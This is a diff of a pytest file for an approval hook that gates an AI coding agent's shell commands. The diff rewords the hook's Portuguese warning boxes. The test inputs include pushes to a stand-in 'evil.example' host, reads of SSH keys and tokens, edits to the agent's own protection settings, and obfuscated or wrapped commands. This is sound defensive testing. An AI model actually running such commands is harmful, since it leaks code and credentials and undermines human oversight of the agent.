@@ -10,7 +10,6 @@ from pathlib import Path
 import pytest
 
 HOOK = Path(__file__).resolve().parents[1] / "hooks" / "approval_gate.py"
-FOOTER = '"Yes" aprova só esta chamada.'
 CODE = "abcdef012345"
 
 
@@ -58,7 +57,6 @@ def box(command, env, cwd="/work"):
     decision = json.loads(out)["hookSpecificOutput"]
     assert decision["hookEventName"] == "PreToolUse"
     assert decision["permissionDecision"] == "ask"
-    assert decision["permissionDecisionReason"].endswith(FOOTER)
     return decision["permissionDecisionReason"]
 
 
@@ -216,17 +214,13 @@ def test_heredoc_that_runs_or_expands_asks(command, env):
 
 def test_a_commit_message_heredoc_does_not_hide_a_push_after_it(env):
     command = "git commit -m \"$(cat <<'EOF'\nfeat: x\nEOF\n)\" && git push"
-    assert "git push" in box(command, env)
+    assert "Envia commits para o GitHub" in box(command, env)
 
 
 def test_push_box_names_folder_remote_and_refspec(env):
     text = box("git push origin feature/x", env, cwd="/srv/repo")
 
-    assert text.splitlines()[0] == "Gravar fora — GitHub"
-    assert "/srv/repo" in text
-    assert "Remoto: origin" in text
-    assert "Referências: feature/x" in text
-    assert "ATENÇÃO" not in text
+    assert text.splitlines() == ["Envia commits para o GitHub", "feature/x → origin"]
 
 
 def test_push_box_uses_dash_c_for_the_folder(env):
@@ -286,15 +280,17 @@ def test_push_box_without_a_refspec_names_the_branch_upstream_and_commits_ahead(
 ):
     lines = box(command, env, cwd=str(repo_ahead)).splitlines()
 
-    assert "Branch atual: feature/x, upstream origin/feature/x" in lines
-    assert "Commits à frente do upstream: 2" in lines
-    assert not any(line.startswith("Referências:") for line in lines)
+    assert lines[0] == "Envia commits para o GitHub"
+    assert lines[1].startswith("feature/x → ")
+    assert "2 commits à frente" in lines[1]
+    assert len(lines) == 2
 
 
 def test_push_box_with_dash_c_reads_the_branch_of_that_folder(repo_ahead, env, tmp_path):
     text = box(f"git -C {repo_ahead} push", env, cwd=str(tmp_path))
 
-    assert "Branch atual: feature/x, upstream origin/feature/x" in text
+    assert "feature/x → " in text
+    assert "2 commits à frente" in text
 
 
 @pytest.mark.parametrize(
@@ -317,28 +313,28 @@ def test_a_push_from_another_repository_says_so_and_reads_no_branch(
 
     warning = next(line for line in lines if "outro repositório" in line)
     assert warning.startswith("ATENÇÃO:") and shown in warning
-    assert not any(line.startswith("Branch atual:") for line in lines)
+    assert not any("commits à frente" in line for line in lines)
 
 
 def test_push_box_with_an_explicit_refspec_keeps_the_refspec_line(repo_ahead, env):
     text = box("git push origin feature/x", env, cwd=str(repo_ahead))
 
-    assert "Referências: feature/x" in text
-    assert "Branch atual" not in text
+    assert "feature/x → origin" in text
+    assert "à frente" not in text
 
 
 def test_push_box_falls_back_when_the_branch_has_no_upstream(repo_ahead, env, tmp_path):
     _git(["checkout", "-q", "-b", "lonely"], repo_ahead, tmp_path)
     text = box("git push", env, cwd=str(repo_ahead))
 
-    assert "Referências: as configuradas no repositório" in text
-    assert "Branch atual" not in text
+    assert "as refs configuradas → " in text
+    assert "à frente" not in text
 
 
 def test_push_box_falls_back_on_a_detached_head(repo_ahead, env, tmp_path):
     _git(["checkout", "-q", "--detach"], repo_ahead, tmp_path)
 
-    assert "Referências: as configuradas" in box("git push", env, cwd=str(repo_ahead))
+    assert "as refs configuradas → " in box("git push", env, cwd=str(repo_ahead))
 
 
 def fake_git(tmp_path, env, body):
@@ -368,8 +364,8 @@ def test_push_box_runs_only_the_three_local_queries_without_repo_code(tmp_path, 
     calls = log.read_text(encoding="utf-8").splitlines()
     options = "-c core.fsmonitor=false -c core.hooksPath=/dev/null"
 
-    assert "Branch atual: feature/y, upstream origin/feature/y" in text
-    assert "Commits à frente do upstream: 4" in text
+    assert "feature/y → " in text
+    assert "4 commits à frente" in text
     assert [call.split("|", 1)[1] for call in calls] == [
         f"{options} rev-parse --abbrev-ref HEAD",
         f"{options} rev-parse --abbrev-ref @{{u}}",
@@ -399,7 +395,7 @@ def test_push_box_runs_nothing_when_the_folder_is_not_a_repository(tmp_path, env
     path_env, log = fake_git(tmp_path, env, ANSWERS)
     text = box("git push", path_env, cwd=str(folder))
 
-    assert "Referências: as configuradas no repositório" in text
+    assert "as refs configuradas → " in text
     assert box("git push", path_env, cwd=str(tmp_path / "missing"))
     assert not log.exists()
 
@@ -409,7 +405,7 @@ def test_push_box_runs_nothing_when_dash_c_comes_from_an_expansion(tmp_path, env
     (repo / ".git").mkdir(parents=True)
     path_env, log = fake_git(tmp_path, env, ANSWERS)
 
-    assert "Referências: as configuradas" in box('git -C "$r" push', path_env, cwd=str(repo))
+    assert "as refs configuradas → " in box('git -C "$r" push', path_env, cwd=str(repo))
     assert not log.exists()
 
 
@@ -418,7 +414,7 @@ def test_push_box_falls_back_when_git_fails(tmp_path, env):
     (repo / ".git").mkdir(parents=True)
     path_env, _ = fake_git(tmp_path, env, "exit 128")
 
-    assert "Referências: as configuradas no repositório" in box("git push", path_env, str(repo))
+    assert "as refs configuradas → " in box("git push", path_env, str(repo))
 
 
 def test_push_box_falls_back_when_git_prints_nonsense(tmp_path, env):
@@ -426,7 +422,7 @@ def test_push_box_falls_back_when_git_prints_nonsense(tmp_path, env):
     (repo / ".git").mkdir(parents=True)
     path_env, _ = fake_git(tmp_path, env, 'echo one; echo two; case "$*" in *count*) echo x;; esac')
 
-    assert "Referências: as configuradas no repositório" in box("git push", path_env, str(repo))
+    assert "as refs configuradas → " in box("git push", path_env, str(repo))
 
 
 def test_push_box_gives_up_on_a_slow_git_after_three_seconds(tmp_path, env):
@@ -437,7 +433,7 @@ def test_push_box_gives_up_on_a_slow_git_after_three_seconds(tmp_path, env):
     text = box("git push", path_env, cwd=str(repo))
 
     assert time.monotonic() - started < 8
-    assert "Referências: as configuradas no repositório" in text
+    assert "as refs configuradas → " in text
 
 
 @pytest.mark.parametrize(
@@ -465,8 +461,9 @@ def test_push_delete_is_called_out(env):
 def test_each_push_in_a_chain_is_described(env):
     lines = box("git push && gh pr create -R a/b -B main -H feat -t T", env).splitlines()
 
-    assert "o padrão do repositório ← git push refs padrão da pasta /work" in lines
-    assert "a/b: Criar PR: feat → main" in lines
+    assert lines[0] == "2 pedidos neste comando"
+    assert "as refs configuradas → o remoto padrão" in lines
+    assert "Cria PR em a/b" in lines
 
 
 PUSH_URL = "https://example.com/me/repo.git"
@@ -486,7 +483,7 @@ def test_the_no_box_push_needs_the_push_remotes_list(listed_repo, env):
     write_config(env, '[gate]\npush_without_asking = ["~/repo"]\n')
     lines = box("git push", env, cwd=str(listed_repo)).splitlines()
 
-    assert f"Endereço de envio do origin: {PUSH_URL}" in lines
+    assert "example.com/me/repo" in lines[1]
 
 
 @pytest.mark.parametrize(
@@ -505,8 +502,7 @@ def test_the_no_box_push_asks_when_origin_was_changed_behind_the_gate(
     for command in ("git push", "git push origin main"):
         text = box(command, env, cwd=str(listed_repo))
 
-        assert "Endereço de envio do origin: " in text
-        assert "https://evil.example/" in text
+        assert "evil.example/" in text
 
 
 def test_the_bare_no_box_push_asks_when_the_branch_pushes_to_another_remote(
@@ -722,7 +718,7 @@ def test_push_exception_needs_the_config(env, tmp_path):
     ],
 )
 def test_what_redirects_the_push_asks(command, env):
-    assert box(command, env).splitlines()[0] == "Destino do git push"
+    assert box(command, env).splitlines()[0] == "Muda o destino do git push"
 
 
 @pytest.mark.parametrize(
@@ -843,7 +839,7 @@ def test_gh_graphql_query_from_a_file_asks_without_reading_it(command, env, tmp_
     (tmp_path / "read.graphql").write_text("query { viewer { login } }", encoding="utf-8")
 
     text = box(command, env, cwd=str(tmp_path))
-    assert "Conteúdo: consulta GraphQL lida de arquivo" in text
+    assert "A consulta vem de arquivo ou da entrada" in text
 
 
 def test_gh_pr_create_box(env):
@@ -853,17 +849,18 @@ def test_gh_pr_create_box(env):
     )
     lines = box(command, env).splitlines()
 
-    assert lines[0] == "Gravar fora — GitHub"
-    assert lines[1] == "Criar PR em me/workspace: feature/x → main"
-    assert lines[2] == "Título: docs: release"
-    assert lines[3] == 'Corpo: 3 linhas (primeira: "Resumo da mudança")'
+    assert lines == [
+        "Cria PR em me/workspace",
+        "feature/x → main",
+        "Título: docs: release",
+    ]
 
 
 def test_gh_pr_create_defaults_to_the_folder_and_the_body_file(env):
     text = box("gh pr create -t T -F body.md", env, cwd="/srv/repo")
 
-    assert "Criar PR em /srv/repo (pasta atual): a branch atual → a branch padrão" in text
-    assert "Corpo: arquivo body.md" in text
+    assert "Cria PR em /srv/repo (pasta atual)" in text
+    assert "a branch atual → a branch padrão" in text
 
 
 @pytest.mark.parametrize(
@@ -871,22 +868,22 @@ def test_gh_pr_create_defaults_to_the_folder_and_the_body_file(env):
     [
         (
             "gh -R evil/repo pr create -t T",
-            "Criar PR em evil/repo: a branch atual → a branch padrão",
+            "Cria PR em evil/repo",
         ),
-        ("gh pr -R evil/repo edit 3 -t x", "Editar PR 3 em evil/repo"),
-        ("gh --repo evil/repo pr merge 3", "Mesclar o PR 3 em evil/repo"),
-        ("gh --repo=evil/repo pr comment 3 -b x", "Comentar PR 3 em evil/repo"),
-        ("gh -R evil/repo pr close 3 -R other/repo", "Fechar PR 3 em other/repo"),
+        ("gh pr -R evil/repo edit 3 -t x", "Edita a PR 3 em evil/repo"),
+        ("gh --repo evil/repo pr merge 3", "Mescla o PR 3 em evil/repo"),
+        ("gh --repo=evil/repo pr comment 3 -b x", "Comenta a PR 3 em evil/repo"),
+        ("gh -R evil/repo pr close 3 -R other/repo", "Fecha a PR 3 em other/repo"),
     ],
 )
 def test_gh_box_names_the_repo_given_before_the_group(command, first, env):
-    assert box(command, env, cwd="/srv/repo").splitlines()[1] == first
+    assert box(command, env, cwd="/srv/repo").splitlines()[0] == first
 
 
 def test_gh_pr_merge_box_calls_out_admin_and_delete_branch(env):
     text = box("gh pr merge 12 --squash --admin --delete-branch -R a/b", env)
 
-    assert "Mesclar o PR 12 em a/b" in text
+    assert "Mescla o PR 12 em a/b" in text
     assert "Método: squash" in text
     assert "ATENÇÃO: --admin" in text
     assert "ATENÇÃO: --delete-branch" in text
@@ -902,14 +899,14 @@ def test_gh_pr_merge_short_flags(env):
 @pytest.mark.parametrize(
     ("command", "first"),
     [
-        ("gh pr comment 12 -R a/b -b 'olá'", "Comentar PR 12 em a/b"),
-        ("gh pr edit 12 -R a/b -t 'novo'", "Editar PR 12 em a/b"),
-        ("gh pr close 12 -R a/b", "Fechar PR 12 em a/b"),
-        ("gh issue comment 4 -R a/b -F f.md", "Comentar issue 4 em a/b"),
+        ("gh pr comment 12 -R a/b -b 'olá'", "Comenta a PR 12 em a/b"),
+        ("gh pr edit 12 -R a/b -t 'novo'", "Edita a PR 12 em a/b"),
+        ("gh pr close 12 -R a/b", "Fecha a PR 12 em a/b"),
+        ("gh issue comment 4 -R a/b -F f.md", "Comenta a issue 4 em a/b"),
     ],
 )
 def test_gh_comment_edit_close_boxes(command, first, env):
-    assert box(command, env).splitlines()[1] == first
+    assert box(command, env).splitlines()[0] == first
 
 
 def test_gh_unlisted_write_gets_a_generic_summary(env):
@@ -985,9 +982,10 @@ def test_http_box_shows_method_host_path_and_data_but_not_query_or_login(env):
     command = "curl -u me:secreto -X POST -d '{}' 'https://api.example.com:8443/rest/x?token=abc'"
     lines = box(command, env).splitlines()
 
-    assert lines[0] == "Gravar fora — HTTP"
-    assert lines[1] == "curl POST → api.example.com:8443/rest/x"
-    assert lines[2] == "com dados"
+    assert lines == [
+        "curl POST para api.example.com:8443/rest/x",
+        "Envia dados no corpo da chamada",
+    ]
     assert "abc" not in "\n".join(lines)
     assert "secreto" not in "\n".join(lines)
 
@@ -995,16 +993,18 @@ def test_http_box_shows_method_host_path_and_data_but_not_query_or_login(env):
 def test_http_box_without_data_has_no_data_line(env):
     lines = box("curl -X DELETE https://api.example.com/x/1", env).splitlines()
 
-    assert lines[1] == "curl DELETE → api.example.com/x/1"
-    assert "com dados" not in lines
+    assert lines == ["curl DELETE para api.example.com/x/1"]
 
 
 def test_card_apply_box_shows_the_summary_of_the_pending_record(env):
     write_pending(env, CODE, {"summary": ["TS-1: mover para Done", "TS-2: comentar"]})
     lines = box(f"ws card apply d --approve {CODE}", env).splitlines()
 
-    assert lines[0] == "Gravar fora — Jira"
-    assert lines[1:4] == [f"Aplicar a prévia {CODE}:", "TS-1: mover para Done", "TS-2: comentar"]
+    assert lines == [
+        f"Aplica a prévia {CODE} no Jira",
+        "TS-1: mover para Done",
+        "TS-2: comentar",
+    ]
 
 
 def test_card_apply_box_with_equals_and_an_abbreviated_flag(env):
@@ -1017,11 +1017,11 @@ def test_card_apply_box_with_equals_and_an_abbreviated_flag(env):
 @pytest.mark.parametrize(
     ("record", "expected"),
     [
-        ({"code": CODE}, f"A prévia {CODE} não tem resumo"),
-        ({"summary": []}, f"A prévia {CODE} não tem resumo"),
-        ({"summary": "texto"}, f"A prévia {CODE} não tem resumo"),
-        ({"summary": [1, 2]}, f"A prévia {CODE} não tem resumo"),
-        ([], f"A prévia {CODE} não tem resumo"),
+        ({"code": CODE}, "A prévia não tem resumo"),
+        ({"summary": []}, "A prévia não tem resumo"),
+        ({"summary": "texto"}, "A prévia não tem resumo"),
+        ({"summary": [1, 2]}, "A prévia não tem resumo"),
+        ([], "A prévia não tem resumo"),
     ],
 )
 def test_card_apply_still_asks_when_the_record_has_no_summary(record, expected, env):
@@ -1068,8 +1068,8 @@ def test_card_apply_that_may_read_another_store_asks_and_says_why(command, env):
     (Path(env["WS_DATA_DIR"]) / "cards" / "pending" / f"{CODE}.json").unlink()
     lines = box(command, env).splitlines()
 
-    assert lines[0] == "Comando não lido com certeza"
-    assert "pode mudar a pasta de onde o ws lê a prévia" in lines[1]
+    assert lines[0] == "Não sei o que este comando faz"
+    assert "Pode mudar a pasta de onde o ws lê a prévia" in lines[1]
 
 
 @pytest.mark.parametrize("code", ["short", "ABCDEF012345", "abcdef01234g", "abcdef0123456", "../x"])
@@ -1078,7 +1078,7 @@ def test_card_apply_with_a_malformed_code_asks_without_reading_anything(code, en
 
 
 def test_card_apply_without_approve_says_the_ws_will_refuse(env):
-    assert "sem --approve" in box("ws card apply d", env)
+    assert "Falta o --approve" in box("ws card apply d", env)
 
 
 def test_card_apply_summary_uses_ws_data_dir(env, tmp_path):
@@ -1130,21 +1130,24 @@ def test_card_apply_summary_uses_ws_data_dir(env, tmp_path):
 def test_touching_the_claude_protection_asks(command, env):
     text = box(command, env)
 
-    assert text.splitlines()[0] == "Proteção do Claude Code"
+    assert text.splitlines()[0] == "Mexe na proteção do Claude Code"
     assert "Mexe na proteção do Claude Code" in text
 
 
 def test_protection_box_names_the_path(env):
     text = box("sed -i s/a/b/ ~/.claude/settings.json", env)
 
-    assert "Mexe na proteção do Claude Code: ~/.claude/settings.json" in text
+    assert text.splitlines() == [
+        "Mexe na proteção do Claude Code",
+        "ATENÇÃO: Mexe num arquivo de proteção — `~/.claude/settings.json`",
+    ]
 
 
 def test_protection_box_shows_the_home_as_a_tilde(env):
     home = env["HOME"]
     text = box(f"sed -i s/a/b/ {home}/.claude/settings.json", env)
 
-    assert "Mexe na proteção do Claude Code: ~/.claude/settings.json" in text
+    assert "`~/.claude/settings.json`" in text
 
 
 @pytest.mark.parametrize(
@@ -1236,8 +1239,8 @@ def test_an_unquoted_expansion_in_a_watched_command_asks(command, env):
 def test_obfuscation_box_says_it_is_not_sure_and_shows_the_command(env):
     lines = box("ws card preview $(cat name)", env).splitlines()
 
-    assert lines[0] == "Comando não lido com certeza"
-    assert "Comando: ws card preview $(cat name)" in lines
+    assert lines[0] == "Não sei o que este comando faz"
+    assert lines[1] == "Tem $, crase ou chaves fora de aspas — `$(cat name)`"
 
 
 @pytest.mark.parametrize(
@@ -1302,12 +1305,15 @@ def test_the_fsmonitor_loop_passes(env):
 @pytest.mark.parametrize(
     ("command", "title"),
     [
-        ("gh pr merge $N --squash", "Gravar fora — GitHub"),
-        ("gh pr create -t $TITLE", "Gravar fora — GitHub"),
-        ("gh api repos/$o/$r/issues -f title=$T", "Gravar fora — GitHub"),
-        ("git push origin $B", "Gravar fora — GitHub"),
-        ("git remote add $name $url", "Destino do git push"),
-        ("git config remote.$name.url $url", "Destino do git push"),
+        ("gh pr merge $N --squash", "Mescla o PR $N em /work (pasta atual)"),
+        ("gh pr create -t $TITLE", "Cria PR em /work (pasta atual)"),
+        (
+            "gh api repos/$o/$r/issues -f title=$T",
+            "Grava na API do GitHub: POST repos/$o/$r/issues",
+        ),
+        ("git push origin $B", "Envia commits para o GitHub"),
+        ("git remote add $name $url", "Muda o destino do git push"),
+        ("git config remote.$name.url $url", "Muda o destino do git push"),
     ],
 )
 def test_the_write_families_judge_expanded_arguments_by_their_own_rules(command, title, env):
@@ -1354,7 +1360,7 @@ def test_quoted_or_unrelated_expansions_pass(command, env):
 def test_an_unparseable_command_that_names_a_watched_program_asks(command, env):
     text = box(command, env)
 
-    assert text.splitlines()[0] == "Comando não lido com certeza"
+    assert text.splitlines()[0] == "Não sei o que este comando faz"
 
 
 @pytest.mark.parametrize("command", ["echo 'unterminated", 'ls "x', "cat <<EOF"])
@@ -1386,7 +1392,7 @@ def test_a_program_built_by_an_expansion_asks_when_the_command_names_one(command
     ],
 )
 def test_a_program_name_built_by_an_expansion_asks_whatever_the_command_names(command, env):
-    assert "O nome do programa vem de uma expansão" in box(command, env)
+    assert "O programa vem de uma variável" in box(command, env)
 
 
 @pytest.mark.parametrize(
@@ -1401,7 +1407,7 @@ def test_a_program_name_built_by_an_expansion_asks_whatever_the_command_names(co
     ],
 )
 def test_a_shell_reading_its_commands_from_input_asks(command, env):
-    assert "não dá para lê-los" in box(command, env)
+    assert "chegam ao shell por pipe ou arquivo" in box(command, env)
 
 
 @pytest.mark.parametrize(
@@ -1424,7 +1430,7 @@ def test_a_shell_running_a_named_script_or_a_command_passes(command, env):
     ],
 )
 def test_a_shell_or_eval_running_text_built_by_an_expansion_asks(command, env):
-    assert "não dá para lê-lo" in box(command, env)
+    assert "O script vem de uma variável ou comando" in box(command, env)
 
 
 @pytest.mark.parametrize(
@@ -1448,18 +1454,19 @@ def test_push_box_warns_when_the_command_changes_folder(env):
 def test_two_findings_of_different_kinds_share_one_box(env):
     text = box("sed -i x ~/.claude/settings.json && gh pr merge 3", env)
 
-    assert text.splitlines()[1:3] == [
-        "Mexe na proteção do Claude Code: ~/.claude/settings.json",
-        "/work (pasta atual): Mesclar o PR 3",
+    assert text.splitlines() == [
+        "2 pedidos neste comando",
+        "ATENÇÃO: Mexe num arquivo de proteção — `~/.claude/settings.json`",
+        "Mescla o PR 3 em /work (pasta atual)",
     ]
 
 
-def test_a_long_box_is_cut_to_ten_lines(env):
+def test_a_long_box_is_cut_to_four_lines(env):
     write_pending(env, CODE, {"summary": [f"TS-{n}: item" for n in range(30)]})
     lines = box(f"ws card apply d --approve {CODE}", env).splitlines()
 
-    assert len(lines) <= 10
-    assert lines[-1] == FOOTER
+    assert len(lines) == 4
+    assert lines[-1] == "(+28 linhas)"
 
 
 @pytest.mark.parametrize(
@@ -1487,7 +1494,7 @@ def test_a_long_box_is_cut_to_ten_lines(env):
     ],
 )
 def test_wrappers_and_shell_forms_do_not_hide_a_push(command, env):
-    assert box(command, env).splitlines()[0] == "Gravar fora — GitHub"
+    assert box(command, env).splitlines()[0] == "Envia commits para o GitHub"
 
 
 CREDENTIAL_TITLE = "Lê uma credencial"
@@ -1577,9 +1584,10 @@ def test_credential_box_names_the_path_and_the_command(env):
     home = env["HOME"]
     lines = box(f"cat {home}/.config/workspace/credentials", env).splitlines()
 
-    assert lines[0] == CREDENTIAL_TITLE
-    assert lines[1] == "Lê uma credencial: ~/.config/workspace/credentials"
-    assert lines[2].startswith("Comando: cat ")
+    assert lines == [
+        CREDENTIAL_TITLE,
+        "ATENÇÃO: Lê um arquivo de credencial — `~/.config/workspace/credentials`",
+    ]
 
 
 def test_credential_box_for_the_configured_folder(env):
@@ -1587,16 +1595,16 @@ def test_credential_box_for_the_configured_folder(env):
     lines = box(f"cat {config}/credentials", env).splitlines()
 
     assert lines[0] == CREDENTIAL_TITLE
-    assert lines[1] == f"Lê uma credencial: {config}/credentials"
+    assert lines[1].startswith("ATENÇÃO: Lê um arquivo de credencial — `")
+    assert config[:20] in lines[1]
 
 
 def test_credential_box_for_a_command_names_it(env):
     lines = box("gh auth token", env).splitlines()
 
-    assert lines[1] == "Lê uma credencial: o token do GitHub (gh auth token)"
-    assert lines[2] == "Comando: gh auth token"
+    assert lines[1] == "ATENÇÃO: Lê o token do GitHub (gh auth token) — `gh auth token`"
     lines = box("ws mcp-headers", env).splitlines()
-    assert lines[1] == "Lê uma credencial: os cabeçalhos dos MCPs (ws mcp-headers)"
+    assert lines[1].startswith("ATENÇÃO: Lê os cabeçalhos dos MCPs (ws mcp-headers)")
 
 
 @pytest.mark.parametrize(
@@ -1660,7 +1668,7 @@ def test_deeply_nested_substitutions_decide_fast_and_ask(levels, env):
 def test_a_command_too_big_to_read_asks_even_without_a_watched_name(env):
     text = box("echo " + " ".join(["$(true)"] * 3000), env)
 
-    assert text.splitlines()[0] == "Comando não lido com certeza"
+    assert text.splitlines()[0] == "Não sei o que este comando faz"
     assert "a tempo" in text
 
 
@@ -1686,7 +1694,7 @@ def test_a_command_too_big_to_read_asks_even_without_a_watched_name(env):
     ],
 )
 def test_wrapper_flags_with_values_do_not_hide_a_push(command, env):
-    assert box(command, env).splitlines()[0] == "Gravar fora — GitHub"
+    assert box(command, env).splitlines()[0] == "Envia commits para o GitHub"
 
 
 @pytest.mark.parametrize(
@@ -1701,14 +1709,14 @@ def test_wrapper_flags_with_values_do_not_hide_a_push(command, env):
     ],
 )
 def test_wrappers_that_run_a_command_line_have_it_read(command, env):
-    assert box(command, env).splitlines()[0] == "Gravar fora — GitHub"
+    assert box(command, env).splitlines()[0] == "Envia commits para o GitHub"
 
 
 def test_wrappers_do_not_hide_a_card_apply(env):
     command = "setsid -f ws card apply d --approve abcdef012345"
-    assert box(command, env).splitlines()[0] == "Gravar fora — Jira"
+    assert box(command, env).splitlines()[0] == f"Aplica a prévia {CODE} no Jira"
     command = 'echo s | env -u X script -qec "ws card apply d --approve abcdef012345" /dev/null'
-    assert box(command, env).splitlines()[0] == "Comando não lido com certeza"
+    assert box(command, env).splitlines()[0] == "Não sei o que este comando faz"
 
 
 @pytest.mark.parametrize(
@@ -1728,7 +1736,10 @@ def test_wrappers_do_not_hide_a_card_apply(env):
     ],
 )
 def test_a_watched_program_under_an_unknown_program_asks(command, env):
-    assert box(command, env).splitlines()[0] == "Comando não lido com certeza"
+    assert box(command, env).splitlines()[0] in (
+        "Não sei o que este comando faz",
+        "2 pedidos neste comando",
+    )
 
 
 @pytest.mark.parametrize(
@@ -1792,10 +1803,11 @@ def test_a_git_config_override_that_runs_or_redirects_asks_and_is_shown(command,
 def test_a_push_with_a_remote_override_shows_it_as_the_destination(env):
     lines = box("git -c remote.origin.pushurl=https://evil.example/x push", env).splitlines()
 
-    assert lines[0] == "Gravar fora — GitHub"
-    remote = next(line for line in lines if line.startswith("Remoto:"))
-    assert "o padrão do repositório" not in remote
-    assert "-c remote.origin.pushurl=https://evil.example/x" in remote
+    assert lines[0] == "Envia commits para o GitHub"
+    assert any(
+        line.startswith("ATENÇÃO: -c remote.origin.pushurl=https://evil.example/x")
+        for line in lines
+    )
 
 
 def test_a_push_override_also_defeats_the_no_box_exception(listed_repo, env):
@@ -1848,7 +1860,7 @@ def test_other_pager_and_editor_overrides_still_ask(command, env):
     ],
 )
 def test_a_gh_flag_before_the_action_asks(command, env):
-    assert box(command, env).splitlines()[0] == "Comando não lido com certeza"
+    assert box(command, env).splitlines()[0] == "Não sei o que este comando faz"
 
 
 @pytest.mark.parametrize(
@@ -1947,8 +1959,8 @@ def test_ordinary_reads_near_the_credentials_pass(command, env):
 def test_ws_setup_that_updates_the_protected_copy_asks(command, env):
     lines = box(command, env).splitlines()
 
-    assert lines[0] == "Proteção do Claude Code"
-    assert lines[1] == "Atualiza a cópia protegida dos hooks do Claude Code (ws setup)"
+    assert lines[0] == "Mexe na proteção do Claude Code"
+    assert lines[1].startswith("ATENÇÃO: Atualiza a cópia protegida dos hooks (ws setup)")
 
 
 @pytest.mark.parametrize(
@@ -1956,20 +1968,19 @@ def test_ws_setup_that_updates_the_protected_copy_asks(command, env):
     [
         (
             "ws gate catalog pass github create_pull_request merge_pull_request",
-            "Muda o catálogo do portão: github create_pull_request merge_pull_request "
-            "passam a ser liberadas sem caixa",
+            "Libera ferramentas sem caixa (ws gate catalog pass)",
         ),
         (
             "uv run ws gate catalog ask github get_me",
-            "Muda o catálogo do portão: github get_me passam a pedir aprovação",
+            "Faz ferramentas pedirem aprovação (ws gate catalog ask)",
         ),
         (
             "python3 -m ws gate catalog pass jira search",
-            "Muda o catálogo do portão: jira search passam a ser liberadas sem caixa",
+            "Libera ferramentas sem caixa (ws gate catalog pass)",
         ),
         (
             "/srv/ws/.venv/bin/ws gate catalog ask jira x",
-            "Muda o catálogo do portão: jira x passam a pedir aprovação",
+            "Faz ferramentas pedirem aprovação (ws gate catalog ask)",
         ),
         ("ws gate catalog remove jira x", "Muda o catálogo do portão (ws gate catalog remove)"),
     ],
@@ -1977,13 +1988,14 @@ def test_ws_setup_that_updates_the_protected_copy_asks(command, env):
 def test_ws_gate_catalog_changes_ask(command, line, env):
     lines = box(command, env).splitlines()
 
-    assert lines[0] == "Proteção do Claude Code"
-    assert lines[1] == line
+    assert lines[0] == "Mexe na proteção do Claude Code"
+    assert lines[1].startswith(f"ATENÇÃO: {line} — `")
 
 
 def test_ws_gate_catalog_with_an_expanded_action_is_not_read(env):
     assert (
-        box('ws gate catalog "$A" github x', env).splitlines()[0] == "Comando não lido com certeza"
+        box('ws gate catalog "$A" github x', env).splitlines()[0]
+        == "Não sei o que este comando faz"
     )
 
 
@@ -2002,7 +2014,7 @@ def test_ws_setup_check_and_the_catalog_listing_pass(command, env):
     assert box(command, env) is None
 
 
-def test_a_box_shared_by_several_findings_gives_each_one_line_with_the_destination_first(env):
+def test_a_box_shared_by_several_findings_keeps_every_warning_and_folds_the_rest(env):
     command = (
         "gh pr comment 1 -b a; gh pr comment 2 -b b; gh pr comment 3 -b c; "
         "git push --force https://evil.example/x.git main"
@@ -2010,12 +2022,10 @@ def test_a_box_shared_by_several_findings_gives_each_one_line_with_the_destinati
     lines = box(command, env).splitlines()
 
     assert lines == [
-        "Gravar fora — GitHub",
-        "ATENÇÃO: https://evil.example/x.git ← git push --force main da pasta /work",
-        "/work (pasta atual): Comentar PR 1",
-        "/work (pasta atual): Comentar PR 2",
-        "/work (pasta atual): Comentar PR 3",
-        FOOTER,
+        "4 pedidos neste comando",
+        "ATENÇÃO: envia para um endereço escrito no comando: https://evil.example/x.git",
+        "ATENÇÃO: --force força o envio e pode reescrever o histórico do remoto",
+        "(+4 linhas)",
     ]
 
 
@@ -2023,14 +2033,14 @@ def test_a_box_shared_by_several_findings_gives_each_one_line_with_the_destinati
     ("command", "alert"),
     [
         ("git push origin main", None),
-        ("git push --force origin main", "ATENÇÃO: origin ← git push --force main da pasta /work"),
+        ("git push --force origin main", "ATENÇÃO: --force força o envio"),
         (
             "git push git@evil.example:x.git main",
-            "ATENÇÃO: git@evil.example:x.git ← git push main da pasta /work",
+            "ATENÇÃO: envia para um endereço escrito no comando: git@evil.example:x.git",
         ),
-        ("git -c alias.p=push p", "ATENÇÃO: -c alias.p=push muda o que o git roda"),
-        ("cat ~/.ssh/id_rsa", "ATENÇÃO: Lê uma credencial: ~/.ssh/id_rsa"),
-        ("xargs git push", "ATENÇÃO: Não lido com certeza: O comando passa git"),
+        ("git -c alias.p=push p", "ATENÇÃO: Config na linha muda o que o git roda ou o destino"),
+        ("cat ~/.ssh/id_rsa", "ATENÇÃO: Lê um arquivo de credencial"),
+        ("xargs git push", None),
     ],
 )
 def test_risky_lines_in_a_shared_box_are_marked(command, alert, env):
@@ -2054,10 +2064,9 @@ def test_risky_lines_in_a_shared_box_are_marked(command, alert, env):
 )
 def test_a_compact_line_keeps_the_flags_that_bypass_or_destroy(command, flags, env):
     lines = box(f"gh pr comment 9 -b x; {command}", env).splitlines()
-    line = next(line for line in lines[1:] if "PR 9" not in line)
+    marked = [line for line in lines if line.startswith("ATENÇÃO:")]
 
-    assert line.startswith("ATENÇÃO:")
-    assert all(flag in line for flag in flags)
+    assert all(any(flag in line for line in marked) for flag in flags)
 
 
 def test_a_push_to_an_address_written_in_the_command_is_called_out(env):
@@ -2072,7 +2081,7 @@ def test_a_push_to_an_address_written_in_the_command_is_called_out(env):
 def test_a_word_over_four_kilobytes_asks_before_it_is_read(command, env):
     lines = box(command, env).splitlines()
 
-    assert lines[0] == "Comando não lido com certeza"
+    assert lines[0] == "Não sei o que este comando faz"
     assert "4 KB" in lines[1]
 
 
@@ -2116,7 +2125,7 @@ def test_python_that_only_reads_the_protection_passes(command, env):
 def test_python_that_writes_the_protection_asks_with_one_line(command, env):
     lines = box(command, env).splitlines()
 
-    assert lines[0] == "Proteção do Claude Code"
+    assert lines[0] == "Mexe na proteção do Claude Code"
     assert len([line for line in lines if "Mexe na proteção" in line]) == 1
 
 
@@ -2192,7 +2201,7 @@ def test_python_that_imports_ws_without_applying_a_card_passes(command, env):
     ],
 )
 def test_python_that_applies_a_card_asks_with_the_jira_title(command, env):
-    assert box(command, env).splitlines()[0] == "Gravar fora — Jira"
+    assert box(command, env).splitlines()[0] == "Grava no Jira"
 
 
 ENVIRONMENT_POLICY = (
@@ -2270,10 +2279,10 @@ def test_an_environment_push_in_an_argo_repo_asks_with_a_warning(make_repo, env)
     lines = box("git push origin main", env, cwd=str(repo)).splitlines()
 
     assert lines[:2] == [
-        "Gravar fora — GitHub",
+        "Envia commits para o GitHub",
